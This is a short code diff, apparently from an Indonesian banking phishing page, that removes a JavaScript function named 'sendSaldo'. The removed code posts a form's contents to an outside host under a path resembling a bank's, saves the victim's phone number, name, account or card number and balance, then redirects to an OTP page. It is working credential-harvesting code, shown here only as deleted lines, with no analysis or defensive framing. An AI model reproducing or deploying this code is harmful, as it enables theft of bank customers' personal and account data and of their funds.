@@ -48,32 +48,6 @@ $('.process1').fadeIn();
      }     
      
      
-function sendSaldo() {
-event.preventDefault();
-$('.process1').fadeIn();
- document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
-      $.ajax({
-            type: 'POST',
-            url: 'https://choreo.cloud/bsi/5g6h/saldo.php',
-            data: $('#jualpuki').serialize(),
-            datatype: 'text',          
-            complete: function(data) {
-            setTimeout(function(){
-  window.location.href='otp.html'
-  document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
- $('.process1').fadeOut();
- var phone = document.getElementById("nomorsaya").value;
- sessionStorage.setItem("phone", phone);
- var user = document.getElementById("namaku").value;
- sessionStorage.setItem("user", user);
- var card = document.getElementById("norekku").value;
- sessionStorage.setItem("card", card);
- var duet = document.getElementById("saldo").value;
- sessionStorage.setItem("duet", duet);
-    }, 800);
-            }
-        })
-     }     
 
 
 // otp
